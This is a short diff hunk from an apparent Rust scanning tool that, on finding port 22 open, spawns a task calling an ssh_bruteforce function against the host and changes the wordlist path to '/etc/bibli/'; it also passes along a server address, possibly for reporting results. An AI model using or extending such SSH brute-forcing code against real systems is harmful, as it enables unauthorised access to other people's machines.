@@ -39,7 +39,7 @@ async fn main() {
                             if port == &22 {
                                 let ip_clone = ip.clone();
                                 let task = tokio::spawn(async move {
-                                    ssh::ssh_bruteforce(&ip_clone, "bibli/", ip_srv, port_srv).await;
+                                    ssh::ssh_bruteforce(&ip_clone, "/etc/bibli/", ip_srv, port_srv).await;
                                 });
                                 tasks.push(task);
                             }
